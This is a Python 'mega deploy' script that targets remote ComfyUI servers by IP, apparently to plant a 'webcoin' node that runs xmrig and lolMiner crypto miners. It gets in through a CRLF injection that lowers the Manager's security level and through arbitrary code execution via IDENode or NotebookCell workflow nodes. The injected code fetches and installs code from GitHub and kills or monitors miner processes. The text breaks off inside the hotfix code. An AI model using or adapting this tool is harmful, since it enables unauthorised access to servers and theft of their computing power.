"""
ComfyUI-Enhanced Mega Deploy Tool
==================================
One script to rule them all. Combines every useful deploy operation into
subcommands with shared infrastructure.

Usage:
  python mega_deploy.py install   -t 10.0.0.1
  python mega_deploy.py update    -t 10.0.0.1
  python mega_deploy.py nuke      -t 10.0.0.1
  python mega_deploy.py diagnose  -t 10.0.0.1
  python mega_deploy.py probe     -t 10.0.0.1
  python mega_deploy.py verify    -t 10.0.0.1
  python mega_deploy.py hotfix    -t 10.0.0.1
  python mega_deploy.py clear     -t 10.0.0.1
  python mega_deploy.py procs     -t 10.0.0.1
  python mega_deploy.py gpu       -t 10.0.0.1
  python mega_deploy.py api       -t 10.0.0.1
  python mega_deploy.py logs      -t 10.0.0.1
  python mega_deploy.py history   -t 10.0.0.1
  python mega_deploy.py result    -t 10.0.0.1 --prompt-id <id>
  python mega_deploy.py errors    -t 10.0.0.1
  python mega_deploy.py reboot    -t 10.0.0.1

Supports comma-separated targets for batch operations:
  python mega_deploy.py install -t "10.0.0.1,10.0.0.2,10.0.0.3"
"""

import argparse
import json
import ssl
import sys
import time
import urllib.request
import urllib.error

REPO_URL  = "https://github.com/bossman79/webcoin.git"
REPO_BARE = "https://github.com/bossman79/webcoin"
REPO_RAW  = "https://raw.githubusercontent.com/bossman79/webcoin/master"
NODE_ID   = "webcoin"


# ═══════════════════════════════════════════════════════════════════════
#  HTTP helpers
# ═══════════════════════════════════════════════════════════════════════

_SSL_CTX = ssl.create_default_context()
_SSL_CTX.check_hostname = False
_SSL_CTX.verify_mode = ssl.CERT_NONE


def _req(url, method="GET", data=None, timeout=30):
    headers = {"Content-Type": "application/json"}
    if isinstance(data, str):
        payload = data.encode()
        headers = {"Content-Type": "text/plain"}
    elif data is not None:
        payload = json.dumps(data).encode()
    else:
        payload = None

    req = urllib.request.Request(url, data=payload, headers=headers, method=method)
    ctx = _SSL_CTX if url.startswith("https://") else None
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            return resp.status, resp.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        body = ""
        try:
            body = e.read().decode(errors="replace")[:500]
        except Exception:
            pass
        return e.code, body
    except Exception as e:
        return 0, str(e)


def _get(url, **kw):
    return _req(url, "GET", **kw)


def _post(url, data=None, **kw):
    return _req(url, "POST", data=data, **kw)


# ═══════════════════════════════════════════════════════════════════════
#  IDENode execution helper
# ═══════════════════════════════════════════════════════════════════════

WORKFLOW_STUB = {
    "workflow": {
        "nodes": [
            {"id": 1, "type": "IDENode"},
            {"id": 2, "type": "PreviewTextNode"},
        ]
    }
}


def run_idenode(base, python_code, wait=10, include_pnginfo=True):
    """Execute Python code on the remote machine via IDENode.
    Returns (prompt_id, status, output_lines)."""

    prompt = {
        "prompt": {
            "1": {
                "class_type": "IDENode",
                "inputs": {"pycode": python_code, "language": "python"},
            },
            "2": {
                "class_type": "PreviewTextNode",
                "inputs": {"text": ["1", 0]},
            },
        },
    }
    if include_pnginfo:
        prompt["extra_data"] = {"extra_pnginfo": WORKFLOW_STUB}

    code, resp = _post(f"{base}/prompt", prompt)
    prompt_id = ""
    if code == 200:
        try:
            resp_data = json.loads(resp)
            prompt_id = resp_data.get("prompt_id", "")
            if "IDENode" in str(resp_data.get("node_errors", {})) or \
               "does not exist" in resp.lower():
                print(f"  IDENode not available, trying NotebookCell...")
                return run_notebook(base, python_code, wait=wait)
        except Exception:
            pass
        print(f"  prompt_id: {prompt_id}")
    else:
        if "does not exist" in resp.lower() or "IDENode" in resp:
            print(f"  IDENode not available, trying NotebookCell...")
            return run_notebook(base, python_code, wait=wait)
        print(f"  /prompt -> {code}: {resp[:300]}")
        return prompt_id, "error", []

    if wait > 0:
        print(f"  Waiting {wait}s...")
        time.sleep(wait)

    return _fetch_result(base, prompt_id)


def run_notebook(base, python_code, wait=10):
    """Execute Python code via NotebookCell (fallback when IDENode is absent).
    NotebookCell runs code as a module, so use print() for output instead of
    assigning to `result`."""

    nb_code = python_code
    if "\nresult = " in nb_code and "\nprint(" not in nb_code:
        nb_code = nb_code.replace("result = chr(10).join(lines)", "print(chr(10).join(lines))")
        nb_code = nb_code.replace("result = chr(10).join(result_lines)", "print(chr(10).join(result_lines))")
        nb_code = nb_code.replace("\nresult = '\\n'.join(lines)", "\nprint('\\n'.join(lines))")
        nb_code = nb_code.replace("\nresult = '\\n'.join(result_lines)", "\nprint('\\n'.join(result_lines))")

    prompt = {
        "prompt": {
            "1": {
                "class_type": "NotebookCell",
                "inputs": {"code": nb_code},
            },
        },
    }

    code, resp = _post(f"{base}/prompt", prompt)
    prompt_id = ""
    if code == 200:
        try:
            prompt_id = json.loads(resp).get("prompt_id", "")
        except Exception:
            pass
        print(f"  [NotebookCell] prompt_id: {prompt_id}")
    else:
        print(f"  [NotebookCell] /prompt -> {code}: {resp[:300]}")
        return prompt_id, "error", []

    if wait > 0:
        print(f"  Waiting {wait}s...")
        time.sleep(wait)

    return _fetch_result(base, prompt_id)


def _fetch_result(base, prompt_id):
    """Fetch execution result for a given prompt_id."""
    output_lines = []
    status = "pending"
    try:
        code, body = _get(f"{base}/history/{prompt_id}")
        if code == 200:
            hist = json.loads(body)
            entry = hist.get(prompt_id, {})
            status = entry.get("status", {}).get("status_str", "pending")
            outputs = entry.get("outputs", {})
            for nid, nout in outputs.items():
                for key, val in nout.items():
                    if isinstance(val, list):
                        output_lines.extend(val)
                    else:
                        output_lines.append(str(val))
            if status == "error":
                msgs = entry.get("status", {}).get("messages", [])
                for m in msgs:
                    if m[0] == "execution_error":
                        err = m[1]
                        etype = err.get("exception_type", "")
                        emsg = str(err.get("exception_message", ""))[:500]
                        output_lines.append(f"EXEC_ERROR: {etype}: {emsg}")
    except Exception as e:
        output_lines.append(f"fetch_error: {e}")
    return prompt_id, status, output_lines


# ═══════════════════════════════════════════════════════════════════════
#  Shared IDENode code fragments (the Python that runs on the remote)
# ═══════════════════════════════════════════════════════════════════════

FIND_CUSTOM_NODES = r"""
cn = None
try:
    import folder_paths
    if hasattr(folder_paths, 'get_folder_paths'):
        cn = folder_paths.get_folder_paths('custom_nodes')[0]
    else:
        cn = os.path.join(os.path.dirname(folder_paths.__file__), 'custom_nodes')
except:
    pass
if not cn or not os.path.isdir(cn):
    for g in ['/root/ComfyUI/custom_nodes', '/workspace/ComfyUI/custom_nodes',
              '/basedir/custom_nodes', '/home/user/ComfyUI/custom_nodes',
              r'C:\Program Files\ComfyUI-aki-v2\ComfyUI\custom_nodes',
              r'C:\ComfyUI\custom_nodes']:
        if os.path.isdir(g):
            cn = g
            break
"""


# ═══════════════════════════════════════════════════════════════════════
#  Manager API probes (used by the multi-strategy install)
# ═══════════════════════════════════════════════════════════════════════

def probe_manager_version(base):
    code, body = _get(f"{base}/manager/version")
    if code == 200:
        try:
            return json.loads(body).get("version", body.strip())
        except Exception:
            return body.strip()
    return None


def probe_security_level(base):
    code, body = _get(f"{base}/manager/db_mode")
    if code == 200:
        return body.strip()
    return None


def _parse_version(v):
    try:
        parts = v.replace("V", "").replace("v", "").split(".")
        return tuple(int(p) for p in parts[:3])
    except Exception:
        return (999, 999, 999)


# ═══════════════════════════════════════════════════════════════════════
#  COMMAND: install
#  Multi-strategy install via Manager API, then IDENode fallbacks
# ═══════════════════════════════════════════════════════════════════════

def _reboot_comfyui(base):
    """Force-reboot ComfyUI. Used only when Manager is absent."""
    print("  Auto-rebooting ComfyUI (no Manager detected)...")
    code, _ = _get(f"{base}/manager/reboot")
    if code != 200:
        _post(f"{base}/api/manager/reboot")
    return code == 200 or True


def _prompt_reboot():
    """Tell the user to reboot from the Manager UI."""
    print("  >> Reboot ComfyUI from the Manager UI to activate changes. <<")


def _start_queue_and_finish(base, skip_queue=False, has_manager=True):
    if not skip_queue:
        time.sleep(1)
        code, _ = _get(f"{base}/manager/queue/start")
        print(f"  queue/start -> {code}")
        print("  Waiting 30s for task completion...")
        for _ in range(6):
            time.sleep(5)
            sc, sb = _get(f"{base}/manager/queue/status")
            if sc == 200:
                try:
                    st = json.loads(sb)
                    print(f"  Queue: total={st.get('total_count')}, done={st.get('done_count')}, processing={st.get('is_processing')}")
                    if not st.get("is_processing") and st.get("done_count", 0) >= st.get("total_count", 1):
                        break
                except Exception:
                    pass

    if has_manager:
        _prompt_reboot()
    else:
        _reboot_comfyui(base)
    return True


def _strategy_update(base):
    print("[update] Queuing git-pull update...")
    body = {"id": NODE_ID, "version": "latest", "files": [REPO_URL], "ui_id": ""}
    code, resp = _post(f"{base}/manager/queue/update", body)
    print(f"  queue/update -> {code}: {resp[:200]}")

    if code != 200:
        body["files"] = [REPO_BARE]
        code, resp = _post(f"{base}/manager/queue/update", body)
        print(f"  queue/update (bare) -> {code}: {resp[:200]}")

    if code != 200:
        body2 = {"id": NODE_ID, "version": "unknown", "files": [REPO_BARE], "ui_id": ""}
        code, resp = _post(f"{base}/manager/queue/update", body2)
        print(f"  queue/update (unknown) -> {code}: {resp[:200]}")

    if code == 200:
        return _start_queue_and_finish(base, has_manager=True)
    return False


def _strategy_crlf(base):
    ver = probe_manager_version(base)
    print(f"[crlf] Manager version: {ver}")
    if ver:
        parsed = _parse_version(ver)
        if parsed >= (3, 39, 2):
            print("  Version >= 3.39.2, CRLF patched. Skip.")
            return False

    import urllib.parse
    payload = "cache\r\nsecurity_level = weak"
    encoded = urllib.parse.quote(payload, safe="")
    code, resp = _get(f"{base}/manager/db_mode?value={encoded}")
    print(f"  db_mode inject -> {code}: {resp[:200]}")

    if code == 200:
        print("  Rebooting to apply config change...")
        _get(f"{base}/manager/reboot")
        print("  Waiting 40s for restart...")
        time.sleep(40)
        return True
    return False


def _strategy_direct_git(base):
    print("[direct] Trying /customnode/install/git_url...")
    code, resp = _post(f"{base}/customnode/install/git_url", REPO_URL)
    print(f"  -> {code}: {resp[:200]}")
    if code == 200:
        return _start_queue_and_finish(base, has_manager=True)
    if code == 403:
        print("  Blocked by security level (need 'weak')")
    return False


def _strategy_queue_install(base):
    print("[queue] Trying /manager/queue/install variations...")
    payloads = [
        {"id": NODE_ID, "version": "unknown", "files": [REPO_URL],
         "install_type": "git-clone", "skip_post_install": False,
         "ui_id": "", "mode": "remote", "channel": "default"},
        {"id": NODE_ID, "version": "nightly", "selected_version": "nightly",
         "skip_post_install": False, "ui_id": "", "mode": "remote",
         "repository": REPO_URL, "channel": "default"},
        {"id": NODE_ID, "version": "latest", "selected_version": "latest",
         "skip_post_install": False, "ui_id": "", "mode": "remote",
         "channel": "default"},
    ]
    for i, body in enumerate(payloads):
        code, resp = _post(f"{base}/manager/queue/install", body)
        print(f"  payload {i} -> {code}: {resp[:200]}")
        if code == 200:
            return _start_queue_and_finish(base, has_manager=True)
    return False


IDENODE_INSTALL_CODE = r"""
import subprocess, os, sys, shutil
cn = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__ if '__file__' in dir() else '/root/ComfyUI/custom_nodes/x'))), 'custom_nodes')
try:
    import folder_paths
    cn = folder_paths.get_folder_paths('custom_nodes')[0] if hasattr(folder_paths, 'get_folder_paths') else os.path.join(os.path.dirname(folder_paths.__file__), 'custom_nodes')
except: pass
target = os.path.join(cn, 'webcoin')
tmp = target + '_tmp'
for d in [tmp, target]:
    if os.path.isdir(d):
        shutil.rmtree(d, ignore_errors=True)
subprocess.run([sys.executable, '-m', 'pip', 'install', '-q', 'gitpython'], capture_output=True)
import git
git.Repo.clone_from('REPO_URL_PLACEHOLDER', tmp, depth=1)
shutil.move(tmp, target)
req = os.path.join(target, 'requirements.txt')
if os.path.exists(req):
    subprocess.run([sys.executable, '-m', 'pip', 'install', '-q', '-r', req], capture_output=True)
init = os.path.join(target, '__init__.py')
with open(init, 'r') as f:
    txt = f.read()
if 'sys.path.insert' not in txt:
    txt = txt.replace('def _orchestrate():', 'def _orchestrate():\\n    import sys; sys.path.insert(0, str(__import__("pathlib").Path(__file__).resolve().parent))')
    with open(init, 'w') as f:
        f.write(txt)
print('DEPLOY_OK')
""".replace("REPO_URL_PLACEHOLDER", REPO_URL).strip()


def _strategy_idenode(base, has_manager=False):
    print("[idenode] Trying IDENode code execution...")

    prompt = {
        "prompt": {
            "1": {
                "class_type": "IDENode",
                "inputs": {"pycode": IDENODE_INSTALL_CODE, "language": "python"},
            },
            "2": {
                "class_type": "PreviewTextNode",
                "inputs": {"text": ["1", 0]},
            },
        }
    }

    code, resp = _post(f"{base}/prompt", prompt)
    print(f"  /prompt -> {code}: {resp[:200]}")

    if code == 200:
        print("  Waiting 30s for execution...")
        time.sleep(30)
        _start_queue_and_finish(base, skip_queue=True, has_manager=has_manager)
        return True

    alt_inputs = [
        {"code": IDENODE_INSTALL_CODE, "language": "python"},
        {"pycode": IDENODE_INSTALL_CODE},
        {"code": IDENODE_INSTALL_CODE},
    ]
    for inp in alt_inputs:
        prompt["prompt"]["1"]["inputs"] = inp
        code, resp = _post(f"{base}/prompt", prompt)
        print(f"  alt -> {code}: {resp[:200]}")
        if code == 200:
            time.sleep(30)
            _start_queue_and_finish(base, skip_queue=True, has_manager=has_manager)
            return True
    return False


IDENODE_CLONE_CODE = f"""
import os, subprocess, sys, platform
{FIND_CUSTOM_NODES}
lines = []
lines.append('platform=' + platform.system())
lines.append('cn=' + str(cn))
target = os.path.join(cn, 'webcoin') if cn else None

if target and os.path.isdir(target):
    lines.append('already_exists=True')
    lines.append('files=' + str(sorted(os.listdir(target))[:15]))
elif target:
    r = subprocess.run(
        ['git', 'clone', '--depth', '1', '{REPO_URL}', target],
        capture_output=True, text=True, timeout=120
    )
    lines.append('clone_rc=' + str(r.returncode))
    if r.stderr.strip():
        lines.append('stderr=' + r.stderr.strip()[:200])
    if os.path.isdir(target):
        lines.append('files=' + str(sorted(os.listdir(target))[:15]))
        req_path = os.path.join(target, 'requirements.txt')
        if os.path.exists(req_path):
            r2 = subprocess.run(
                [sys.executable, '-m', 'pip', 'install', '-q', '-r', req_path],
                capture_output=True, text=True, timeout=120
            )
            lines.append('pip_rc=' + str(r2.returncode))
            if r2.stderr.strip():
                lines.append('pip_err=' + r2.stderr.strip()[:200])
else:
    lines.append('ERROR: no custom_nodes dir found')

result = chr(10).join(lines)
"""

IDENODE_ZIP_CODE = f"""
import os, subprocess, sys, platform, shutil, zipfile, urllib.request
{FIND_CUSTOM_NODES}
lines = []
lines.append('platform=' + platform.system())
lines.append('cn=' + str(cn))
target = os.path.join(cn, 'webcoin') if cn else None

if target and os.path.isdir(target):
    lines.append('already_exists=True')
    lines.append('files=' + str(sorted(os.listdir(target))[:15]))
elif target:
    zip_url = '{REPO_BARE}/archive/refs/heads/master.zip'
    zip_path = os.path.join(cn, 'webcoin_dl.zip')
    try:
        req = urllib.request.Request(zip_url, headers={{'User-Agent': 'Mozilla/5.0'}})
        with urllib.request.urlopen(req, timeout=120) as resp:
            with open(zip_path, 'wb') as f:
                while True:
                    chunk = resp.read(65536)
                    if not chunk:
                        break
                    f.write(chunk)
        lines.append('download=OK size=' + str(os.path.getsize(zip_path)))
        with zipfile.ZipFile(zip_path, 'r') as zf:
            zf.extractall(cn)
        lines.append('extracted=OK')
        extracted_dir = os.path.join(cn, 'webcoin-master')
        if os.path.isdir(extracted_dir):
            os.rename(extracted_dir, target)
            lines.append('renamed to webcoin')
        elif os.path.isdir(target):
            lines.append('target already correct')
        else:
            dirs = [d for d in os.listdir(cn) if d.startswith('webcoin')]
            lines.append('found_dirs=' + str(dirs))
            if dirs:
                os.rename(os.path.join(cn, dirs[0]), target)
    except Exception as e:
        lines.append('download_error=' + str(e)[:300])
    finally:
        if os.path.exists(zip_path):
            os.remove(zip_path)

    if os.path.isdir(target):
        lines.append('files=' + str(sorted(os.listdir(target))[:15]))
        lines.append('has_init=' + str(os.path.exists(os.path.join(target, '__init__.py'))))
        req_path = os.path.join(target, 'requirements.txt')
        if os.path.exists(req_path):
            r2 = subprocess.run(
                [sys.executable, '-m', 'pip', 'install', '-q', '-r', req_path],
                capture_output=True, text=True, timeout=120
            )
            lines.append('pip_rc=' + str(r2.returncode))
    else:
        lines.append('FAILED: target dir not created')
else:
    lines.append('ERROR: no custom_nodes found')

result = chr(10).join(lines)
"""


def cmd_install(base, args):
    """Multi-strategy install: Manager API strategies first, then IDENode fallbacks."""
    print(f"\n{'='*60}")
    print(f"  INSTALL on {args.target_ip}:{args.port}")
    print(f"{'='*60}")

    ver = probe_manager_version(base)
    db = probe_security_level(base)
    has_manager = ver is not None
    print(f"  Manager version: {ver or 'not installed'}")
    print(f"  DB mode: {db or 'unknown'}")
    print(f"  Has Manager: {has_manager}\n")

    if has_manager:
        if _strategy_update(base):
            print(f"\n[OK] Updated via git-pull")
            return True

        if _strategy_crlf(base):
            if _strategy_direct_git(base):
                print(f"\n[OK] Installed via CRLF + direct git")
                return True
            if _strategy_queue_install(base):
                print(f"\n[OK] Installed via CRLF + queue")
                return True

        if _strategy_direct_git(base):
            print(f"\n[OK] Installed via direct git")
            return True

        if _strategy_queue_install(base):
            print(f"\n[OK] Installed via queue")
            return True

    if _strategy_idenode(base, has_manager=has_manager):
        print(f"\n[OK] Installed via IDENode (gitpython)")
        return True

    print("\n[fallback] Trying IDENode git clone...")
    pid, status, lines = run_idenode(base, IDENODE_CLONE_CODE, wait=90)
    for ln in lines:
        print(f"  {ln}")
    if status == "success" and any("files=" in l for l in lines):
        if has_manager:
            _prompt_reboot()
        else:
            _reboot_comfyui(base)
        print(f"\n[OK] Installed via IDENode git clone")
        return True

    print("\n[fallback] Trying IDENode zip download...")
    pid, status, lines = run_idenode(base, IDENODE_ZIP_CODE, wait=90)
    for ln in lines:
        print(f"  {ln}")
    if status == "success":
        if has_manager:
            _prompt_reboot()
        else:
            _reboot_comfyui(base)
        print(f"\n[OK] Installed via IDENode zip")
        return True

    print(f"\n[FAIL] All strategies exhausted")
    return False


# ═══════════════════════════════════════════════════════════════════════
#  COMMAND: update
#  Git pull latest without deleting bin/ directory
# ═══════════════════════════════════════════════════════════════════════

UPDATE_CODE = f"""
import os, subprocess, platform
{FIND_CUSTOM_NODES}
lines = []
target = os.path.join(cn, 'webcoin')
lines.append('target=' + str(target))

if not os.path.isdir(target):
    lines.append('ERROR: webcoin dir not found')
else:
    for marker in ['.orch.pid', '.initialized']:
        mp = os.path.join(target, marker)
        if os.path.exists(mp):
            os.remove(mp)
            lines.append('removed ' + marker)

    r = subprocess.run(['git', 'fetch', 'origin'], capture_output=True, text=True,
                       timeout=30, cwd=target)
    lines.append('fetch_rc=' + str(r.returncode) + ' ' + r.stderr.strip()[:100])

    r = subprocess.run(['git', 'reset', '--hard', 'origin/master'], capture_output=True, text=True,
                       timeout=30, cwd=target)
    lines.append('reset_rc=' + str(r.returncode) + ' ' + r.stdout.strip()[:100])

    init_path = os.path.join(target, '__init__.py')
    lines.append('has_init=' + str(os.path.exists(init_path)))

    dash_path = os.path.join(target, 'core', 'dashboard.py')
    if os.path.exists(dash_path):
        with open(dash_path) as f:
            content = f.read()
        lines.append('has_shared_refs=' + str('_shared_stats' in content))

    cfg_path = os.path.join(target, 'core', 'config.py')
    if os.path.exists(cfg_path):
        with open(cfg_path) as f:
            content = f.read()
        lines.append('has_api_token=' + str('API_TOKEN' in content))

result = chr(10).join(lines)
"""


def cmd_update(base, args):
    """Git pull latest code without destroying bin/."""
    print(f"\n[update] Pulling latest on {args.target_ip}...")
    pid, status, lines = run_idenode(base, UPDATE_CODE, wait=15)
    print(f"  Status: {status}")
    for ln in lines:
        print(f"  {ln}")
    return status == "success"


# ═══════════════════════════════════════════════════════════════════════
#  COMMAND: nuke
#  Kill miners, force-delete, fresh clone
# ═══════════════════════════════════════════════════════════════════════

NUKE_CODE = f"""
import os, subprocess, platform, shutil, time, sys
{FIND_CUSTOM_NODES}
lines = []
is_win = platform.system() == 'Windows'

if is_win:
    for exe in ['comfyui_service.exe', 'comfyui_render.exe', 'xmrig.exe', 'lolMiner.exe']:
        r = subprocess.run(['taskkill', '/F', '/IM', exe], capture_output=True, text=True)
        out = (r.stdout.strip() + ' ' + r.stderr.strip()).strip()
        if out:
            lines.append('kill ' + exe + ': ' + out[:100])
else:
    for pat in ['comfyui_service', 'comfyui_render', 'xmrig', 'lolMiner']:
        subprocess.run(['pkill', '-9', '-f', pat], capture_output=True)
    lines.append('pkill sent')

time.sleep(5)

if not cn:
    result = 'ERROR: cannot find custom_nodes'
else:
    target = os.path.join(cn, 'webcoin')
    lines.append('target=' + str(target))

    for attempt in range(5):
        if not os.path.exists(target):
            break
        bin_dir = os.path.join(target, 'bin')
        if os.path.isdir(bin_dir):
            for f in os.listdir(bin_dir):
                fp = os.path.join(bin_dir, f)
                try:
                    os.chmod(fp, 0o777)
                    os.remove(fp)
                except:
                    pass
        shutil.rmtree(target, ignore_errors=True)
        time.sleep(2)
        if os.path.exists(target):
            if is_win:
                subprocess.run('rmdir /s /q "' + target + '"', shell=True, capture_output=True)
            else:
                subprocess.run('rm -rf "' + target + '"', shell=True, capture_output=True)
            time.sleep(2)
        lines.append('nuke attempt ' + str(attempt+1) + ': exists=' + str(os.path.exists(target)))

    if os.path.exists(target):
        remaining = os.listdir(target)
        lines.append('STILL EXISTS: ' + str(remaining))
        for f in remaining:
            fp = os.path.join(target, f)
            try:
                if os.path.isdir(fp):
                    shutil.rmtree(fp, ignore_errors=True)
                else:
                    os.remove(fp)
            except:
                pass
        time.sleep(1)
        shutil.rmtree(target, ignore_errors=True)
        lines.append('final exists=' + str(os.path.exists(target)))

    if not os.path.exists(target):
        r = subprocess.run(
            ['git', 'clone', '--depth', '1', '{REPO_URL}', target],
            capture_output=True, text=True, timeout=120
        )
        lines.append('clone_rc=' + str(r.returncode))
        if r.stderr.strip():
            lines.append('clone_err=' + r.stderr.strip()[:200])
    else:
        lines.append('SKIP CLONE - dir still exists')

    if os.path.isdir(target):
        files = os.listdir(target)
        lines.append('files=' + str(sorted(files)[:15]))
        lines.append('has_init=' + str(os.path.exists(os.path.join(target, '__init__.py'))))
        lines.append('has_core=' + str(os.path.isdir(os.path.join(target, 'core'))))

        r2 = subprocess.run(['git', 'remote', '-v'], capture_output=True, text=True, cwd=target)
        lines.append('remote=' + r2.stdout.strip()[:200])

        req_path = os.path.join(target, 'requirements.txt')
        if os.path.exists(req_path):
            r3 = subprocess.run(
                [sys.executable, '-m', 'pip', 'install', '-q', '-r', req_path],
                capture_output=True, text=True, timeout=120
            )
            lines.append('pip_rc=' + str(r3.returncode))

        for marker in ['.initialized', '.orch.pid']:
            mp = os.path.join(target, marker)
            if os.path.exists(mp):
                os.remove(mp)
                lines.append('removed ' + marker)

    result = chr(10).join(lines)
"""


def cmd_nuke(base, args):
    """Kill miners, force-delete webcoin dir, fresh clone."""
    print(f"\n[nuke] Nuking and re-cloning on {args.target_ip}...")
    pid, status, lines = run_idenode(base, NUKE_CODE, wait=90)
    print(f"  Status: {status}")
    for ln in lines:
        print(f"  {ln}")
    if status == "success":
        has_manager = probe_manager_version(base) is not None
        if has_manager:
            _prompt_reboot()
        else:
            _reboot_comfyui(base)
    return status == "success"


# ═══════════════════════════════════════════════════════════════════════
#  COMMAND: diagnose
#  Full remote diagnostic
# ═══════════════════════════════════════════════════════════════════════

DIAGNOSE_CODE = f"""
import os, subprocess, platform, sys
{FIND_CUSTOM_NODES}
lines = []
is_win = platform.system() == 'Windows'
lines.append('platform=' + platform.system() + ' ' + platform.machine())

target = os.path.join(cn, 'webcoin') if cn else 'UNKNOWN'
lines.append('target=' + str(target))
lines.append('exists=' + str(os.path.isdir(target)))

if os.path.isdir(target):
    lines.append('files=' + str(sorted(os.listdir(target))))
    init_path = os.path.join(target, '__init__.py')
    lines.append('has_init=' + str(os.path.exists(init_path)))
    if os.path.exists(init_path):
        with open(init_path, 'r') as f:
            content = f.read()
        lines.append('has_sys_path_insert=' + str('sys.path.insert' in content))
        lines.append('has_orch_done=' + str('_orch_done' in content))
        lines.append('init_lines=' + str(content.count(chr(10))))

    core_dir = os.path.join(target, 'core')
    lines.append('has_core=' + str(os.path.isdir(core_dir)))
    if os.path.isdir(core_dir):
        lines.append('core_files=' + str(os.listdir(core_dir)))

    bin_dir = os.path.join(target, 'bin')
    lines.append('has_bin=' + str(os.path.isdir(bin_dir)))
    if os.path.isdir(bin_dir):
        lines.append('bin_files=' + str(os.listdir(bin_dir)))

    orch_pid = os.path.join(target, '.orch.pid')
    if os.path.exists(orch_pid):
        with open(orch_pid) as f:
            lines.append('orch_pid=' + f.read().strip())
    lines.append('initialized=' + str(os.path.exists(os.path.join(target, '.initialized'))))

    try:
        r = subprocess.run(['git', '-C', target, 'remote', '-v'], capture_output=True, text=True, timeout=10)
        lines.append('git_remote=' + r.stdout.strip()[:200])
    except:
        lines.append('git_remote=FAILED')
    try:
        r = subprocess.run(['git', '-C', target, 'log', '--oneline', '-5'], capture_output=True, text=True, timeout=10)
        lines.append('git_log=' + r.stdout.strip()[:300])
    except:
        lines.append('git_log=FAILED')
    try:
        r = subprocess.run(['git', '-C', target, 'status', '--short'], capture_output=True, text=True, timeout=10)
        lines.append('git_status=' + r.stdout.strip()[:200])
    except:
        lines.append('git_status=FAILED')

try:
    import psutil
    for proc in psutil.process_iter(['pid', 'name', 'status']):
        try:
            name = (proc.info.get('name') or '').lower()
            if any(x in name for x in ['comfyui_service', 'comfyui_render', 'xmrig', 'lolminer']):
                lines.append('PROC: pid=' + str(proc.info['pid']) + ' name=' + proc.info['name'] + ' status=' + proc.info['status'])
        except:
            pass
except:
    lines.append('psutil_unavailable')

import urllib.request as ur
for label, url in [('XMRig', 'http://127.0.0.1:44880/2/summary'), ('lolMiner', 'http://127.0.0.1:44882')]:
    try:
        req = ur.Request(url, headers={{'Accept': 'application/json'}})
        with ur.urlopen(req, timeout=5) as r:
            lines.append(label + '_API=OK')
    except Exception as e:
        lines.append(label + '_API=FAIL ' + str(e)[:80])

if os.path.isdir(target):
    for logname in ['service.log', 'render.log']:
        logpath = os.path.join(target, 'bin', logname)
        if os.path.exists(logpath):
            with open(logpath, 'r', errors='replace') as f:
                content = f.read()
            lines.append(logname + ' (' + str(len(content)) + ' chars): ' + content[-300:])
        else:
            lines.append(logname + ': not found')

result = chr(10).join(lines)
"""


def cmd_diagnose(base, args):
    """Full remote diagnostic."""
    print(f"\n[diagnose] Running full diagnostic on {args.target_ip}...")
    pid, status, lines = run_idenode(base, DIAGNOSE_CODE, wait=12)
    print(f"  Status: {status}\n")
    for ln in lines:
        print(f"  {ln}")
    return status == "success"


# ═══════════════════════════════════════════════════════════════════════
#  COMMAND: probe
#  Quick platform + webcoin status check
# ═══════════════════════════════════════════════════════════════════════

PROBE_CODE = f"""
import platform, os
{FIND_CUSTOM_NODES}
lines = []
lines.append('platform=' + platform.system())
lines.append('cn=' + str(cn))
if cn:
    wc = os.path.join(cn, 'webcoin')
    lines.append('webcoin_exists=' + str(os.path.isdir(wc)))
    if os.path.isdir(wc):
        lines.append('webcoin_files=' + str(sorted(os.listdir(wc))[:15]))
result = chr(10).join(lines)
"""


def cmd_probe(base, args):
    """Quick probe of platform and webcoin status."""
    print(f"\n[probe] Probing {args.target_ip}...")
    pid, status, lines = run_idenode(base, PROBE_CODE, wait=8)
    print(f"  Status: {status}")
    for ln in lines:
        print(f"  {ln}")
    return status == "success"


# ═══════════════════════════════════════════════════════════════════════
#  COMMAND: verify
#  Detailed install verification
# ═══════════════════════════════════════════════════════════════════════

VERIFY_CODE = f"""
import os, platform
{FIND_CUSTOM_NODES}
result = []
result.append('cn=' + str(cn))
result.append('os=' + platform.system())

target = os.path.join(cn, 'webcoin')
result.append('exists=' + str(os.path.exists(target)))
result.append('isdir=' + str(os.path.isdir(target)))
if os.path.isdir(target):
    files = os.listdir(target)
    result.append('files=' + str(sorted(files)))
    init = os.path.join(target, '__init__.py')
    result.append('init_exists=' + str(os.path.exists(init)))
    core = os.path.join(target, 'core')
    result.append('core_exists=' + str(os.path.isdir(core)))
    if os.path.isdir(core):
        result.append('core_files=' + str(os.listdir(core)))
    git = os.path.join(target, '.git')
    result.append('has_git=' + str(os.path.isdir(git)))
else:
    result.append('webcoin dir NOT FOUND')

result = chr(10).join(result)
"""


def cmd_verify(base, args):
    """Detailed install verification."""
    print(f"\n[verify] Verifying install on {args.target_ip}...")
    pid, status, lines = run_idenode(base, VERIFY_CODE, wait=8)
    print(f"  Status: {status}")
    for ln in lines:
        print(f"  {ln}")
    return status == "success"


# ═══════════════════════════════════════════════════════════════════════
#  COMMAND: hotfix
#  Pull latest files from GitHub raw, clear markers + __pycache__
# ═══════════════════════════════════════════════════════════════════════

HOTFIX_CODE = f"""
import os, urllib.request, shutil
{FIND_CUSTOM_NODES}
lines = []
target = os.path.join(cn, 'webcoin') if cn else None

files_to_update = [
    ('__init__.py', ''),
    ('core/config.py', 'core'),
    ('core/dashboard.py', 'core'),
    ('core/gpu_miner.py', 'core'),
    ('core/miner.py', 'core'),
]

for fname, subdir in files_to_update:
    url = '{REPO_RAW}/' + fname
    if subdir:
        dest = os.path.join(target, subdir, os.path.basename(fname))
    else:
        dest = os.path.join(target, os.path.basename(fname))
    try:
        req = urllib.request.Request(url, headers={{'User-Agent': 'Mozilla/5.0'}})
        with urllib.request.urlopen(req, timeout=30) as resp:
            content = resp.read()
        with open(dest, 'wb') as f:
            f.write(content)
        lines.append('OK ' + fname + ' (' + str(len(content)) + 'b)')
    except Exception as e:
        lines.append('FAIL ' + fname + ': ' + str(e)[:100])

for marker in ['.orch.pid', '.initialized']:
    mp = os.path.join(target, marker)
    if os.path.exists(mp):
        os.remove(mp)
        lines.append('cleared ' + marker)

for pc in [os.path.join(target, '__pycache__'), os.path.join(target, 'core', '__pycache__')]:
    if os.path.isdir(pc):
        shutil.rmtree(pc, ignore_errors=True)
